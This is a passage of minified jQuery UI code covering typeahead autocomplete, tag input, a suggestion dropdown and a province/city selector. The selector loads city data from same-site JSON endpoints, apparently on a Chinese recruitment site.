            }),
            1 == (i = c(s).map(function(e, t) {
                if ("category" == (t.__type || !1))
                    return c(n.options.headerHtml).text(t.name)[0];
                if ("divider" == (t.__type || !1))
                    return c(n.options.headerDivider)[0];
                var i = a.displayText(t);
                return (e = c(n.options.item).data("value", t)).find("a").html(n.highlighter(i, t)),
                i == a.$element.val() && (e.addClass("active"),
                a.$element.data("active", t),
                o = !0),
                e[0]
            })).length && n.options.emptyItem && i.eq(0).addClass("empty").find("a").prepend("<span>回车添加标签</span>"),
            i.length && a.$menu.parent().find(".skills-pannel").hide(),
            this.autoSelect && !o && (i.filter(":not(.dropdown-header)").first().addClass("active"),
            this.$element.data("active", i.first().data("value"))),
            this.$menu.html(i),
            this
        },
        displayText: function(e) {
            return void 0 !== e && void 0 !== e.name ? e.name : e
        },
        next: function(e) {
            var t = this.$menu.find(".active").removeClass("active").next();
            (t = t.length ? t : c(this.$menu.find("li")[0])).addClass("active"),
            t.hasClass("empty") || this.$element.val(t.text())
        },
        prev: function(e) {
            var t = this.$menu.find(".active").removeClass("active").prev();
            (t = t.length ? t : this.$menu.find("li").last()).addClass("active"),
            t.hasClass("empty") || this.$element.val(t.text())
        },
        listen: function() {
            this.$element.on("focus", c.proxy(this.focus, this)).on("blur", c.proxy(this.blur, this)).on("keypress", c.proxy(this.keypress, this)).on("propertychange input", c.proxy(this.input, this)).on("keyup", c.proxy(this.keyup, this)),
            this.eventSupported("keydown") && this.$element.on("keydown", c.proxy(this.keydown, this)),
            this.$menu.on("click", c.proxy(this.click, this)).on("mouseenter", "li", c.proxy(this.mouseenter, this)).on("mouseleave", "li", c.proxy(this.mouseleave, this)).on("mousedown", c.proxy(this.mousedown, this))
        },
        destroy: function() {
            this.$element.data("typeahead", null),
            this.$element.data("active", null),
            this.$element.off("focus").off("blur").off("keypress").off("propertychange input").off("keyup"),
            this.eventSupported("keydown") && this.$element.off("keydown"),
            this.$menu.remove(),
            this.destroyed = !0
        },
        eventSupported: function(e) {
            var t = e in this.$element;
            return t || (this.$element.setAttribute(e, "return;"),
            t = "function" == typeof this.$element[e]),
            t
        },
        move: function(e) {
            if (this.shown)
                switch (e.keyCode) {
                case 9:
                case 13:
                case 27:
                    e.preventDefault();
                    break;
                case 38:
                    if (e.shiftKey)
                        return;
                    e.preventDefault(),
                    this.prev();
                    break;
                case 40:
                    if (e.shiftKey)
                        return;
                    e.preventDefault(),
                    this.next()
                }
        },
        keydown: function(e) {
            this.keyPressed = !0,
            this.suppressKeyPressRepeat = ~c.inArray(e.keyCode, [40, 38, 9, 13, 27]),
            this.shown || 40 != e.keyCode ? this.move(e) : this.lookup()
        },
        keypress: function(e) {
            this.suppressKeyPressRepeat || this.move(e)
        },
        input: function(e) {
            var t = this.$element.val() || this.$element.text();
            this.value !== t && (this.value = t,
            this.lookup())
        },
        keyup: function(e) {
            if (!this.destroyed)
                switch (e.keyCode) {
                case 40:
                case 38:
                case 16:
                case 17:
                case 18:
                    break;
                case 9:
                    if (!this.shown || this.showHintOnFocus && !this.keyPressed)
                        return;
                    this.select();
                    break;
                case 13:
                    if (!this.shown)
                        return;
                    this.select();
                    break;
                case 27:
                    if (!this.shown)
                        return;
                    this.hide()
                }
        },
        focus: function(e) {
            this.focused || (this.focused = !0,
            this.keyPressed = !1,
            this.options.showHintOnFocus && !0 !== this.skipShowHintOnFocus && ("all" === this.options.showHintOnFocus ? this.lookup("") : this.lookup())),
            this.skipShowHintOnFocus && (this.skipShowHintOnFocus = !1)
        },
        blur: function(e) {
            this.mousedover || this.mouseddown || !this.shown ? this.mouseddown && (this.skipShowHintOnFocus = !0,
            this.$element.focus(),
            this.mouseddown = !1) : (this.hide(),
            this.focused = !1,
            this.keyPressed = !1)
        },
        click: function(e) {
            e.preventDefault(),
            this.skipShowHintOnFocus = !0,
            this.select(),
            this.$element.focus(),
            this.hide()
        },
        mouseenter: function(e) {
            this.mousedover = !0,
            this.$menu.find(".active").removeClass("active"),
            c(e.currentTarget).addClass("active")
        },
        mouseleave: function(e) {
            this.mousedover = !1,
            !this.focused && this.shown && this.hide()
        },
        mousedown: function(e) {
            this.mouseddown = !0,
            this.$menu.one("mouseup", function(e) {
                this.mouseddown = !1
            }
            .bind(this))
        }
    };
    var e = c.fn.typeahead;
    c.fn.typeahead = function(i) {
        var n = arguments;
        return "string" == typeof i && "getActive" == i ? this.data("active") : this.each(function() {
            var e = c(this)
              , t = e.data("typeahead");
            t || e.data("typeahead", t = new a(this,"object" == typeof i && i)),
            "string" == typeof i && t[i] && (1 < n.length ? t[i].apply(t, Array.prototype.slice.call(n, 1)) : t[i]())
        })
    }
    ,
    a.defaults = {
        source: [],
        items: 8,
        menu: '<ul class="typeahead dropdown-menu" role="listbox"></ul>',
        item: '<li><a class="dropdown-item" href="javascript:;" role="option"></a></li>',
        minLength: 1,
        scrollHeight: 0,
        autoSelect: !0,
        afterSelect: c.noop,
        addItem: !1,
        delay: 0,
        separator: "category",
        headerHtml: '<li class="dropdown-header"></li>',
        headerDivider: '<li class="divider" role="separator"></li>'
    },
    c.fn.typeahead.Constructor = a,
    c.fn.typeahead.noConflict = function() {
        return c.fn.typeahead = e,
        this
    }
    ,
    c(document).on("focus.typeahead.data-api", '[data-provide="typeahead"]', function(e) {
        var t = c(this);
        t.data("typeahead") || t.typeahead(t.data())
    })
}),
!function(u) {
    "use strict";
    var t = {
        tagClass: function(e) {
            return "label label-info"
        },
        focusClass: "focus",
        itemValue: function(e) {
            return e && e.toString()
        },
        itemText: function(e) {
            return this.itemValue(e)
        },
        itemTitle: function(e) {
            return null
        },
        freeInput: !0,
        addOnBlur: !0,
        maxTags: void 0,
        maxChars: void 0,
        confirmKeys: [13, 44],
        delimiter: ",",
        delimiterRegex: null,
        cancelConfirmKeysOnEmpty: !1,
        onTagExists: function(e, t) {
            t.hide().fadeIn()
        },
        trimValue: !1,
        allowDuplicates: !1,
        triggerChange: !0,
        listTags: !1,
        showListTags: null
    };
    function s(e, t) {
        this.isInit = !0,
        this.itemsArray = [],
        this.$element = u(e),
        this.$element.hide(),
        this.isSelect = "SELECT" === e.tagName,
        this.multiple = this.isSelect && e.hasAttribute("multiple"),
        this.objectItems = t && t.itemValue,
        this.placeholderText = e.hasAttribute("placeholder") ? this.$element.attr("placeholder") : "",
        this.inputSize = Math.max(1, this.placeholderText.length),
        this.$container = u('<div class="bootstrap-tagsinput"></div>'),
        this.$input = u('<input type="text" placeholder="' + this.placeholderText + '"/>').appendTo(this.$container),
        this.$element.before(this.$container),
        this.build(t),
        this.isInit = !1
    }
    function n(e, t) {
        var i;
        "function" != typeof e[t] && (i = e[t],
        e[t] = function(e) {
            return e[i]
        }
        )
    }
    function o(e, t) {
        var i;
        "function" != typeof e[t] && (i = e[t],
        e[t] = function() {
            return i
        }
        )
    }
    s.prototype = {
        constructor: s,
        add: function(e, t, i) {
            var n = this;
            if (!(n.options.maxTags && n.itemsArray.length >= n.options.maxTags) && (!1 === e || e)) {
                if ("object" == typeof (e = "string" == typeof e && n.options.trimValue ? u.trim(e) : e) && !n.objectItems)
                    throw "Can't add objects when itemValue option is not set";
                if (!e.toString().match(/^\s*$/)) {
                    if (n.isSelect && !n.multiple && 0 < n.itemsArray.length && n.remove(n.itemsArray[0]),
                    "string" == typeof e && "INPUT" === this.$element[0].tagName) {
                        var a = n.options.delimiterRegex || n.options.delimiter
                          , o = e.split(a);
                        if (1 < o.length) {
                            for (var s = 0; s < o.length; s++)
                                this.add(o[s], !0);
                            return void (t || n.pushVal(n.options.triggerChange))
                        }
                    }
                    var r, c = n.options.itemValue(e), a = n.options.itemText(e), l = n.options.tagClass(e), d = n.options.itemTitle(e), p = u.grep(n.itemsArray, function(e) {
                        return n.options.itemValue(e) === c
                    })[0];
                    p && !n.options.allowDuplicates ? n.options.onTagExists && (r = u(".tag", n.$container).filter(function() {
                        return u(this).data("item") === p
                    }),
                    n.options.onTagExists(e, r)) : n.items().toString().length + e.length + 1 > n.options.maxInputLength || (r = u.Event("beforeItemAdd", {
                        item: e,
                        cancel: !1,
                        options: i
                    }),
                    n.$element.trigger(r),
                    r.cancel || (n.itemsArray.push(e),
                    (r = u('<span class="tag ' + h(l) + (null !== d ? '" title="' + d : "") + '">' + h(a) + '<span data-role="remove"></span></span>')).data("item", e),
                    n.findInputWrapper().before(r),
                    r.after(" "),
                    l = u('option[value="' + encodeURIComponent(c) + '"]', n.$element).length || u('option[value="' + h(c) + '"]', n.$element).length,
                    n.isSelect && !l && ((d = u("<option selected>" + h(a) + "</option>")).data("item", e),
                    d.attr("value", c),
                    n.$element.append(d)),
                    t || n.pushVal(n.options.triggerChange),
                    n.options.maxTags !== n.itemsArray.length && n.items().toString().length !== n.options.maxInputLength || n.$container.addClass("bootstrap-tagsinput-max"),
                    u(".typeahead, .twitter-typeahead", n.$container).length && n.$input.typeahead("val", ""),
                    this.isInit ? n.$element.trigger(u.Event("itemAddedOnInit", {
                        item: e,
                        options: i
                    })) : n.$element.trigger(u.Event("itemAdded", {
                        item: e,
                        options: i
                    }))))
                }
            }
        },
        remove: function(t, e, i) {
            var n = this;
            if (t = n.objectItems ? (t = "object" == typeof t ? u.grep(n.itemsArray, function(e) {
                return n.options.itemValue(e) == n.options.itemValue(t)
            }) : u.grep(n.itemsArray, function(e) {
                return n.options.itemValue(e) == t
            }))[t.length - 1] : t) {
                var a = u.Event("beforeItemRemove", {
                    item: t,
                    cancel: !1,
                    options: i
                });
                if (n.$element.trigger(a),
                a.cancel)
                    return;
                u(".tag", n.$container).filter(function() {
                    return u(this).data("item") === t
                }).remove(),
                u("option", n.$element).filter(function() {
                    return u(this).data("item") === t
                }).remove(),
                -1 !== u.inArray(t, n.itemsArray) && n.itemsArray.splice(u.inArray(t, n.itemsArray), 1)
            }
            e || n.pushVal(n.options.triggerChange),
            n.options.maxTags > n.itemsArray.length && n.$container.removeClass("bootstrap-tagsinput-max"),
            n.$element.trigger(u.Event("itemRemoved", {
                item: t,
                options: i
            })),
            n.options.itemRemoved && n.options.itemRemoved(t)
        },
        removeAll: function() {
            var e = this;
            for (u(".tag", e.$container).remove(),
            u("option", e.$element).remove(); 0 < e.itemsArray.length; )
                e.itemsArray.pop();
            e.pushVal(e.options.triggerChange)
        },
        refresh: function() {
            var o = this;
            u(".tag", o.$container).each(function() {
                var e = u(this)
                  , t = e.data("item")
                  , i = o.options.itemValue(t)
                  , n = o.options.itemText(t)
                  , a = o.options.tagClass(t);
                e.attr("class", null),
                e.addClass("tag " + h(a)),
                e.contents().filter(function() {
                    return 3 == this.nodeType
                })[0].nodeValue = h(n),
                o.isSelect && u("option", o.$element).filter(function() {
                    return u(this).data("item") === t
                }).attr("value", i)
            })
        },
        items: function() {
            return this.itemsArray
        },
        pushVal: function() {
            var t = this
              , e = u.map(t.items(), function(e) {
                return t.options.itemValue(e).toString()
            });
            t.$element.val(e, !0),
            t.options.triggerChange && t.$element.trigger("change")
        },
        build: function(e) {
            var i, a, r = this;
            r.options = u.extend({}, t, e),
            r.objectItems && (r.options.freeInput = !1),
            n(r.options, "itemValue"),
            n(r.options, "itemText"),
            o(r.options, "tagClass"),
            r.options.listTags && u(r.options.listTags).on("click", "li", function() {
                r.add(u(this).text()),
                r.options.showListTags(u(this).text(), r)
            }),
            r.options.typeahead && (o(i = r.options.typeahead || {}, "source"),
            r.$input.typeahead(u.extend({}, i, {
                source: function(e, a) {
                    function t(e) {
                        for (var t = [], i = 0; i < e.length; i++) {
                            var n = r.options.itemText(e[i]);
                            o[n] = e[i],
                            t.push(n)
                        }
                        a(t)
                    }
                    this.map = {};
                    var o = this.map
                      , e = i.source(e);
                    u.isFunction(e.success) ? e.success(t) : (u.isFunction(e.then) ? e : u.when(e)).then(t)
                },
                updater: function(e) {
                    return r.add(this.map[e]),
                    this.map[e]
                },
                matcher: function(e) {
                    return -1 !== e.toLowerCase().indexOf(this.query.trim().toLowerCase())
                },
                sorter: function(e) {
                    return e.sort()
                },
                highlighter: function(e) {
                    var t, i = this.query.replace(/(^\s*)|(\s*$)/g, "");
                    if ("" == i)
                        return e;
                    i = i.replace(/[\(\)\/\.\*\+\?\[\]]/g, function(e) {
                        return "\\" + e
                    });
                    try {
                        t = new RegExp("(" + i + ")","ig")
                    } catch (e) {}
                    return e.replace(t, '<u class="h">$1</u>')
                }
            }))),
            r.options.typeaheadjs && (a = r.options.typeaheadjs,
            u.isArray(a) || (a = [null, a]),
            u.fn.typeahead.apply(r.$input, a).on("typeahead:selected", u.proxy(function(e, t, i) {
                var n = 0;
                a.some(function(e, t) {
                    return e.name === i && (n = t,
                    !0)
                }),
                a[n].valueKey ? r.add(t[a[n].valueKey]) : r.add(t),
                r.$input.typeahead("val", "")
            }, r))),
            r.$container.on("click", u.proxy(function(e) {
                r.$element.attr("disabled") || r.$input.removeAttr("disabled"),
                r.$input.focus()
            }, r)),
            r.options.addOnBlur && r.options.freeInput && r.$input.on("focusout", u.proxy(function(e) {
                0 === u(".typeahead, .twitter-typeahead", r.$container).length && (r.add(r.$input.val()),
                r.$input.val(""))
            }, r)),
            r.$container.on({
                focusin: function() {
                    r.$container.addClass(r.options.focusClass)
                },
                focusout: function() {
                    r.$container.removeClass(r.options.focusClass)
                }
            }),
            r.$container.on("keydown", "input", u.proxy(function(e) {
                var t = u(e.target)
                  , i = r.findInputWrapper();
                if (r.$element.attr("disabled"))
                    r.$input.attr("disabled", "disabled");
                else {
                    switch (e.which) {
                    case 8:
                        0 !== c(t[0]) || (n = i.prev()).length && r.remove(n.data("item"));
                        break;
                    case 46:
                        0 !== c(t[0]) || (n = i.next()).length && r.remove(n.data("item"));
                        break;
                    case 37:
                        var n = i.prev();
                        0 === t.val().length && n[0] && (n.before(i),
                        t.focus());
                        break;
                    case 39:
                        n = i.next();
                        0 === t.val().length && n[0] && (n.after(i),
                        t.focus())
                    }
                    e = t.val().length;
                    Math.ceil(e / 5);
                    t.attr("size", Math.max(this.inputSize, t.val().length))
                }
            }, r)),
            r.$container.on("keypress", "input", u.proxy(function(e) {
                var t, i, a, o, n, s = u(e.target);
                r.$element.attr("disabled") ? r.$input.attr("disabled", "disabled") : (t = s.val(),
                i = r.options.maxChars && t.length >= r.options.maxChars,
                r.options.freeInput && (a = e,
                n = r.options.confirmKeys,
                o = !1,
                u.each(n, function(e, t) {
                    if ("number" == typeof t && a.which === t)
                        return !(o = !0);
                    if (a.which === t.which) {
                        var i = !t.hasOwnProperty("altKey") || a.altKey === t.altKey
                          , n = !t.hasOwnProperty("shiftKey") || a.shiftKey === t.shiftKey
                          , t = !t.hasOwnProperty("ctrlKey") || a.ctrlKey === t.ctrlKey;
                        if (i && n && t)
                            return !(o = !0)
                    }
                }),
                o || i) && (0 !== t.length && (r.add(i ? t.substr(0, r.options.maxChars) : t),
                s.val("")),
                !1 === r.options.cancelConfirmKeysOnEmpty && e.preventDefault()),
                n = s.val().length,
                Math.ceil(n / 5),
                s.attr("size", Math.max(this.inputSize, s.val().length)))
            }, r)),
            r.$container.on("click", "[data-role=remove]", u.proxy(function(e) {
                r.$element.attr("disabled") || r.remove(u(e.target).closest(".tag").data("item"))
            }, r)),
            r.options.itemValue === t.itemValue && ("INPUT" === r.$element[0].tagName ? r.add(r.$element.val()) : u("option", r.$element).each(function() {
                r.add(u(this).attr("value"), !0)
            })),
            r.options.onReady && r.options.onReady(r)
        },
        destroy: function() {
            var e = this;
            e.$container.off("keypress", "input"),
            e.$container.off("click", "[role=remove]"),
            e.$container.remove(),
            e.$element.removeData("tagsinput"),
            e.$element.show()
        },
        focus: function() {
            this.$input.focus()
        },
        input: function() {
            return this.$input
        },
        findInputWrapper: function() {
            for (var e = this.$input[0], t = this.$container[0]; e && e.parentNode !== t; )
                e = e.parentNode;
            return u(e)
        }
    },
    u.fn.tagsinput = function(i, n, a) {
        var o = [];
        return this.each(function() {
            var e, t = u(this).data("tagsinput");
            t ? i || n ? void 0 !== t[i] && void 0 !== (e = 3 === t[i].length && void 0 !== a ? t[i](n, null, a) : t[i](n)) && o.push(e) : o.push(t) : (t = new s(this,i),
            u(this).data("tagsinput", t),
            o.push(t),
            "SELECT" === this.tagName && u("option", u(this)).attr("selected", "selected"),
            u(this).val(u(this).val()))
        }),
        "string" != typeof i || 1 < o.length ? o : o[0]
    }
    ,
    u.fn.tagsinput.Constructor = s;
    var i = u("<div />");
    function h(e) {
        return e ? i.text(e).html() : ""
    }
    function c(e) {
        var t, i = 0;
        return document.selection ? (e.focus(),
        (t = document.selection.createRange()).moveStart("character", -e.value.length),
        i = t.text.length) : !e.selectionStart && "0" != e.selectionStart || (i = e.selectionStart),
        i
    }
    u(function() {
        u("input[data-role=tagsinput], select[multiple][data-role=tagsinput]").tagsinput()
    })
}(window.jQuery),
!function(_) {
    "use strict";
    var S = window.document;
    function D(t, i, n) {
        return function(e) {
            "function" == typeof t && t.call(n, e && 0 < e.length ? e : void 0, i)
        }
    }
    _.fn.suggestion = function(y) {
        var e, t, $ = this, x = y.throttleTime || 150, k = void 0 === y.focusSugges || !!y.focusSugges, C = y.onRequest || function() {
            return ""
        }
        , T = '<div class="suggestion" style="display: none;"><ul class="suggestion-list"></ul>';
        y.blankHTML && (T = (T += '<div class="suggestion-blank">') + (e = y.blankHTML,
        t = {
            searchText: '<span class="suggestion-text"></span>'
        },
        e.replace(/\$\w+\$/gi, function(e) {
            e = t[e.replace(/\$/g, "")];
            return e + "" == "undefined" ? "" : e
        })) + "</div>"),
        T += "</div>",
        this.each(function(e, t) {
            var o = _(t)
              , s = (y.wrap || y.list || o.append(T),
            0 < _(y.input || ".suggestion-ipt", o).length ? _(y.input || ".suggestion-ipt", o) : _(".suggestion-ipt", o))
              , r = 0 < _(y.wrap || ".suggestion", o).length ? _(y.wrap || ".suggestion", o) : _(".suggestion", o)
              , c = 0 < _(y.list, r).length ? _(y.list, r) : _(".suggestion-list", r)
              , i = 0 < _(y.blank, r).length ? _(y.blank, r) : _(".suggestion-blank", r)
              , l = _(".suggestion-text", i)
              , n = D(y.onChecked, o, $)
              , d = D(y.onHover, o, $)
              , a = D(y.onShow, o, $)
              , p = D(y.onHide, o, $)
              , u = 0
              , h = !1
              , f = !0
              , m = 0
              , g = -1;
            function v(e) {
                n(e, o),
                r.trigger("suggestion.hide")
            }
            function w(e, n) {
                "" !== _.trim(s.val()) && r.trigger("suggestion.show");
                var a = _(e || "");
                g = -1,
                (m = 0) < a.length ? (m = a.length,
                a.each(function(e, t) {
                    var i = _(this);
                    i.text() === n && (a.removeClass("active"),
                    i.addClass("active"),
                    g = e)
                }),
                c.show(),
                0 < i.length && i.hide()) : (c.hide(),
                0 < i.length && (l.text(n),
                i.show())),
                c.html(a)
            }
            function b() {
                var e, t = _.trim(s.val());
                t ? (e = C(t, function(e) {
                    w(e, t)
                })) && w(e, t) : (c.html(""),
                r.trigger("suggestion.hide"))
            }
            r.bind("suggestion.show", function() {
                r.show(),
                a()
            }),
            r.bind("suggestion.hide", function() {
                r.hide(),
                p()
            }),
            s.on("focus", function() {
                k && _.trim(_(this).val()) && b()
            }),
            s.on("blur", function() {
                var t, i = _.trim(s.val());
                f && r.is(":visible") && (0 < _("li.active", c).length ? v(_("li.active", c)) : (t = -1,
                _("li", c).each(function(e) {
                    _.trim(_(this).val()) === i && (t = e)
                }),
                -1 < t ? v(_("li", c).eq(t)) : v()))
            }),
            s.on("compositionstart", function() {
                h = !0
            }),
            s.on("compositionend", function() {
                h = !1,
                b()
            }),
            s.on("input", function(e) {
                var t;
                h || (t = _.trim(s.val()),
                clearTimeout(u),
                "" === t ? r.trigger("suggestion.hide") : u = setTimeout(function() {
                    b()
                }, x))
            }),
            s.on("keydown", function(e) {
                if (!(r.is(":hidden") || 0 == m || h || 13 != e.keyCode && 38 != e.keyCode && 40 != e.keyCode)) {
                    switch (e.preventDefault(),
                    e.keyCode) {
                    case 13:
                        return _("li.active", c).trigger("click"),
                        void s.blur();
                    case 38:
                        -2 == --g && (g = _("li", c).length - 1);
                        break;
                    case 40:
                        ++g == _("li", c).length && (g = -1)
                    }
                    _("li", c).removeClass("active"),
                    -1 != g && _("li", c).eq(g).addClass("active"),
                    -1 == g ? 38 == e.keyCode ? n = _("li", c).last() : 40 == e.keyCode && (n = _("li", c).first()) : n = _("li", c).eq(g);
                    var e = _(".suggestion", o)
                      , t = e.height()
                      , e = e.offset().top
                      , i = n.height()
                      , n = n.offset().top
                      , a = c.parent().scrollTop();
                    n < e ? c.parent().scrollTop(a - (e - n)) : e + t < n + i && c.parent().scrollTop(a + (n + i - (e + t))),
                    d(_("li.active", c), o)
                }
            }),
            c.on("mouseenter", "li", function(e) {
                _(this).addClass("hover"),
                d(_(this), o)
            }),
            c.on("mouseleave", "li", function(e) {
                _(this).removeClass("hover")
            }),
            c.on("mouseleave", function() {
                d(_("li.active", this), o)
            }),
            r.on("mousedown", function(e) {
                f = !1
            }),
            _(S).on("click", function(e) {
                _(e.target).closest(r).length && v(_(e.target).closest(_("li", r)))
            }),
            _(S).on("mouseup", function(e) {
                f = !0,
                0 == _(e.target).closest(s).length && s.trigger("blur")
            })
        }),
        y.ready && y.ready.call(this, this)
    }
}(jQuery),
!function(x) {
    "use strict";
    var k = window.document
      , u = []
      , C = {}
      , h = {}
      , T = {}
      , _ = null
      , f = '<li data-code="$code$" data-name="$name$">$name$</li>'
      , m = ""
      , g = !1
      , v = []
      , S = !1;
    function D(e, t) {
        return e.replace(/\$\w+\$/gi, function(e) {
            e = t[e.replace(/\$/g, "")];
            return e + "" == "undefined" ? "" : e
        })
    }
    function E(e, t) {
        for (var i = t.length, n = "", a = 0; a < i; a++)
            n += D(e, t[a]);
        return n
    }
    function j(t, i, n) {
        return function(e) {
            "function" == typeof t && t.call(n, e && 0 < e.length ? e : void 0, i)
        }
    }
    x.fn.citySelector = function(w) {
        var t, e, b = this, y = (e = w.cityItemTemp,
        t = e || f,
        function(e) {
            return E(t, u[e].subLevelModelList)
        }
        ), $ = w.suggestItemHtml || '<li data-code="$code$" data-name="$name$"><span>$province$</span>$name$</li>';
        x(this).length && (e = function() {
            var v = w.provinceItemTemp ? E(w.provinceItemTemp, u) : m;
            b.each(function() {
                var i = x(this)
                  , n = (i.append('<div class="city-selector"><ul class="city-selector-province"></ul><ul class="city-selector-citys"></ul></div>'),
                _ && w.onLocation && "function" == typeof w.onLocation && w.onLocation.call(this, _),
                0 < x(w.input || ".suggestion-ipt", i).length ? x(w.input || ".suggestion-ipt", i) : x(".suggestion-ipt", i))
                  , e = (0 < x(w.input || ".suggestion-ipt", i).length ? x(w.input || ".suggestion-ipt", i) : x(".suggestion-ipt", i),
                x.trim(n.val()))
                  , c = x(".city-selector", i)
                  , l = x(".city-selector-province", i)
                  , d = x(".city-selector-citys", i)
                  , p = 0
                  , u = 0
                  , h = 0
                  , t = !0
                  , a = j(w.onChecked, i, b)
                  , o = j(w.onHover, i, b)
                  , s = j(w.onShow, i, b)
                  , r = j(w.onHide, i, b);
                function f() {
                    var e, t, i, n, a, o, s = x("li", l).removeClass("active").eq(p).addClass("active"), r = x("li", d).removeClass("active").eq(u).addClass("active");
                    0 === h ? (d.removeClass("city-selector-cur"),
                    l.addClass("city-selector-cur")) : (l.removeClass("city-selector-cur"),
                    d.addClass("city-selector-cur")),
                    s = s,
                    r = r,
                    e = c.height(),
                    t = c.offset().top,
                    i = s.height(),
                    s = s.offset().top,
                    n = r.height(),
                    r = r.offset().top,
                    a = l.scrollTop(),
                    o = d.scrollTop(),
                    s < t ? l.scrollTop(a - (t - s)) : t + e < s + i && l.scrollTop(a + (s + i - (t + e))),
                    r < t ? d.scrollTop(o - (t - r)) : t + e < r + n && d.scrollTop(o + (r + n - (t + e)))
                }
                function m() {
                    d.html(y(p)),
                    f()
                }
                function g(e) {
                    var e = x.trim(e);
                    !e || (e = C[e]) && (u = T[e.code] ? (p = 0,
                    T[e.code].index) : (p = e.provinceIndex,
                    e.index),
                    h = 1,
                    m())
                }
                c.bind("selector.show", function() {
                    c.is(":hidden") && (c.show(),
                    s())
                }),
                c.bind("selector.hide", function() {
                    c.is(":visible") && (c.hide(),
                    r())
                }),
                l.html(v),
                m(),
                e && g(e),
                n.is(":focus") && c.trigger("selector.show"),
                l.on("mouseenter", function(e) {
                    h = 0,
                    f()
                }),
                d.on("mouseenter", function(e) {
                    h = 1,
                    f()
                }),
                x("li", l).on("mouseenter", function(e) {
                    var t = x("li", l).index(this);
                    t != p && (p = t,
                    u = 0,
                    m(),
                    o(x("li.active", d)))
                }),
                x(d).on("mouseenter", "li", function(e) {
                    var t = x("li", d).index(this);
                    t != u && (u = t,
                    f(),
                    o(x("li.active", d)))
                }),
                x(d).on("click", "li", function(e) {
                    a(x(this)),
                    c.trigger("selector.hide")
                }),
                x("li", l).on("click", function(e) {
                    a(x("li.active", d)),
                    c.trigger("selector.hide")
                }),
                n.on("focus", function() {
                    i.find(".dropdown-select").addClass("dropdown-select-open"),
                    c.trigger("selector.show")
                }),
                n.on("blur", function() {
                    i.find(".dropdown-select").removeClass("dropdown-select-open"),
                    t && c.is(":visible") && c.trigger("selector.hide")
                }),
                n.on("input", function(e) {
                    "" === x.trim(e.target.value) ? c.trigger("selector.show") : c.trigger("selector.hide")
                }),
                n.on("keydown", function(e) {
                    var t = e.keyCode;
                    if (!(c.is(":hidden") || 13 != t && 37 != t && 38 != t && 39 != t && 40 != t)) {
                        e.preventDefault();
                        var i = !1;
                        switch (t) {
                        case 13:
                            x("li.active", d).trigger("click"),
                            n.blur();
                            break;
                        case 38:
                            0 === h ? (--p,
                            i = !(u = 0)) : --u;
                            break;
                        case 40:
                            0 === h ? (++p,
                            i = !(u = 0)) : ++u;
                            break;
                        case 37:
                            h = 0;
                            break;
                        case 39:
                            h = 1
                        }
                        e = x("li", l).length - 1,
                        t = x("li", d).length - 1;
                        p < 0 ? p = e : e < p && (p = 0),
                        u < 0 ? u = t : t < u && (u = 0),
                        (i ? m : f)()
                    }
                }),
                c.on("mousedown", function(e) {
                    t = !1
                }),
                x(k).on("mouseup", function(e) {
                    t = !0,
                    0 == x(e.target).closest(n).length && c.trigger("selector.hide")
                }),
                i.suggestion({
                    input: n,
                    focusSugges: !1,
                    blankHTML: '无此城市<a href="javascript:;">去选择</a>',
                    ready: function() {
                        x(".suggestion-blank", this).on("click", function() {
                            c.trigger("selector.show")
                        })
                    },
                    onShow: function() {
                        0
                    },
                    onHide: function() {
                        0
                    },
                    onRequest: function(e, o) {
                        e ? x.ajax({
                            url: "/autocomplete/city.json",
                            data: {
                                query: e || ""
                            },
                            type: "get",
                            dataType: "json",
                            success: function(e) {
                                if (e && e.data instanceof Array) {
                                    for (var t = e.data, i = t.length, n = [], a = 0; a < i; a++)
                                        n.push(C[t[a].code]);
                                    o(x(E($, n)))
                                }
                            }
                        }) : o("")
                    },
                    onChecked: function(e, t) {
                        e && 0 < e.length && g(e.text()),
                        a(e, i)
                    },
                    onHover: function(e, t) {
                        o(e, i)
                    }
                })
            })
        }
        ,
        g ? e() : (v.push(e),
        S || x.ajax({
            url: "/wapi/zpCommon/data/city.json",
            type: "get",
            dataType: "json",
            success: function(e) {
                if (0 == e.code) {
                    e.zpData.hotCityList.splice(0, 1);
                    var t = e.zpData.cityList
                      , i = t.length
                      , n = e.zpData.hotCityList
                      , a = n.length
                      , o = {
                        code: 1e8,
                        name: "热门",
                        subLevelModelList: n,
                        firstChar: "a",
                        rank: 0,
                        index: 0
                    };
                    e.zpData.locationCity && (_ = e.zpData.locationCity),
                    u.push(o),
                    h[o.code] = o,
                    h[o.name] = o,
                    m += D(f, o);
                    for (var s, r = 0; r < i; r++) {
                        var c = t[r].subLevelModelList.length;
                        t[r].index = r + 1,
                        u.push(t[r]),
                        h[t[r].name] = t[r],
                        h[t[r].code] = t[r],
                        m += D(f, t[r]);
                        for (var l = 0; l < c; l++)
                            t[r].subLevelModelList[l].index = l,
                            t[r].subLevelModelList[l].provinceCode = t[r].code,
                            t[r].subLevelModelList[l].province = t[r].name,
                            t[r].subLevelModelList[l].provinceIndex = t[r].index,
                            C[t[r].subLevelModelList[l].code] = t[r].subLevelModelList[l],
                            C[t[r].subLevelModelList[l].name] = t[r].subLevelModelList[l]
                    }
                    for (var d, p = 0; p < a; p++)
                        n[p].index = p,
                        s = 1e4 * parseInt(n[p] / 1e4),
                        h[s] && (n[p].provinceCode = h[s].code,
                        n[p].province = h[s].name,
                        n[p].provinceIndex = h[s].index),
                        T[n[p].code] = n[p],
                        T[n[p].name] = n[p];
                    for (S = g = !0; d = v.shift(); )
                        d()
                }
            }
        })))
    }
}(jQuery),
!function(e) {
    "function" == typeof define && define.amd ? define(["jquery"], e) : "object" == typeof exports ? e(require("jquery")) : e(jQuery)
}(function(n) {
    var o, a = {
        get: function(e) {
            return s[o].get.apply(this, [e])
        },
        set: function(e, t) {
            var i, n = parseInt(e), a = parseInt(t);
            return void 0 === e ? n = 0 : e < 0 && (n = this[0].value.length + n),
            void 0 !== t && (i = 0 <= t ? n + a : this[0].value.length + a),
            s[o].set.apply(this, [n, i]),
            this
        },
        setcursor: function(e) {
            return this.textrange("set", e, 0)
        },
        replace: function(e) {
            return s[o].replace.apply(this, [String(e)]),
            this
        },
        insert: function(e) {
            return this.textrange("replace", e)
        }
    }, s = {
        xul: {
            get: function(e) {
                var t = {
                    position: this[0].selectionStart,
                    start: this[0].selectionStart,
                    end: this[0].selectionEnd,
                    length: this[0].selectionEnd - this[0].selectionStart,
                    text: this.val().substring(this[0].selectionStart, this[0].selectionEnd)
                };
                return void 0 === e ? t : t[e]
            },
            set: function(e, t) {
                void 0 === t && (t = this[0].value.length),
                this[0].selectionStart = e,
                this[0].selectionEnd = t
            },
            replace: function(e) {
                var t = this[0].selectionStart
                  , i = this[0].selectionEnd
